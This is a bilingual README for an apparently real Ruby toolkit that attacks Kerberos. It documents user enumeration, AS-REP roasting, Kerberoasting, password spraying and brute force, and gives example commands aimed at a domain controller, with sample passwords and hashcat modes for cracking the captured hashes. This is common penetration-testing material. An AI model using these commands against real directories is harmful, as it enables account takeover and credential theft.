# Cerber

[![ci](https://github.com/d3xm0s/Cerber/actions/workflows/ci.yml/badge.svg)](https://github.com/d3xm0s/Cerber/actions/workflows/ci.yml)
[![license: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
![ruby](https://img.shields.io/badge/ruby-%3E%3D3.0-CC342D.svg)
![deps: none](https://img.shields.io/badge/dependencies-0-success.svg)

*[English](#english) | [Русский](#русский)*

## English

Kerberos attack toolkit in pure Ruby - zero gems, zero impacket, standard
library only. Talks raw Kerberos to the KDC over port 88: hand-rolled ASN.1
DER, MD4/RC4 (OpenSSL 3 dropped them), AES-CTS-HMAC, PA-ENC-TIMESTAMP and
TGS authenticator with body checksum - the full protocol path.

### Commands

| Command | What it does | Output |
|---|---|---|
| `enum` | user enumeration via AS-REQ error codes (no auth, no preauth) | hits, locked, roastable |
| `asrep` | AS-REP roast - accounts with DONT_REQ_PREAUTH | `$krb5asrep$` hashes |
| `tgs` | Kerberoast - TGS for each SPN with valid creds | `$krb5tgs$` hashes |
| `spray` | password spray via AS-REQ preauth (one pass, many users) | valid creds |
| `brute` | single-user brute force via preauth | valid password |

Hashes drop straight into hashcat / john:

```sh
# as-rep roast
ruby cerber.rb asrep users.txt --dc 10.10.20.2 --realm CORP.LOCAL --out asrep.hash
hashcat -m 18200 asrep.hash rockyou.txt   # etype 23
hashcat -m 32200 asrep.hash rockyou.txt   # etype 18 (aes256)

# kerberoast - spns.txt holds one SPN per line (or account|SPN pairs)
ruby cerber.rb tgs spns.txt --dc 10.10.20.2 --realm CORP.LOCAL --user alice --pass 'Passw0rd' --out tgs.hash
hashcat -m 13100 tgs.hash rockyou.txt     # etype 23
hashcat -m 19700 tgs.hash rockyou.txt     # etype 18

# spray one password across the directory
ruby cerber.rb spray users.txt --dc 10.10.20.2 --realm CORP.LOCAL --pass 'Winter2025!'

# enum - no creds at all
ruby cerber.rb enum users.txt --dc 10.10.20.2 --realm CORP.LOCAL
```

### Notes

- etype 23 (RC4-HMAC) and 17/18 (AES-CTS-HMAC-SHA1) fully supported, including
  the MS-KILE usage-8 quirk for RC4 AS-REP decryption
- hashcat salt for AES is `realm + account` - the SPN list accepts
  `account|service/host` pairs when the account name differs from the SPN
- AS-REP hashes from MIT Kerberos realms use key usage 8 while Windows AD uses
  3 - hashcat expects the AD flavor, so roast hashes crack against AD targets
- no LDAP - Cerber only speaks Kerberos

## Русский

Атаки на Kerberos на чистом Ruby - ноль гемов, ноль impacket, только
стандартная библиотека. Говорит с KDC сырым Kerberos по 88 порту:
собственный ASN.1 DER, MD4/RC4 (в OpenSSL 3 их выпилили), AES-CTS-HMAC,
PA-ENC-TIMESTAMP и authenticator с чек-суммой тела запроса - полный путь
протокола.

### Команды

| Команда | Что делает | Вывод |
|---|---|---|
| `enum` | нумерация пользователей по кодам ошибок AS-REQ | хиты, залоченные, roastable |
| `asrep` | AS-REP roast - аккаунты без preauth | `$krb5asrep$` хеши |
| `tgs` | Kerberoast - TGS для каждого SPN по валидным кредам | `$krb5tgs$` хеши |
| `spray` | спрей пароля через preauth | валидные креды |
| `brute` | брутфорс одного пользователя | валидный пароль |

```sh
ruby cerber.rb asrep users.txt --dc 10.10.20.2 --realm CORP.LOCAL --out asrep.hash
hashcat -m 18200 asrep.hash rockyou.txt   # etype 23
hashcat -m 32200 asrep.hash rockyou.txt   # etype 18

ruby cerber.rb tgs spns.txt --dc 10.10.20.2 --realm CORP.LOCAL --user alice --pass 'Passw0rd' --out tgs.hash
hashcat -m 13100 tgs.hash rockyou.txt     # etype 23
hashcat -m 19700 tgs.hash rockyou.txt     # etype 18
```

## License

MIT
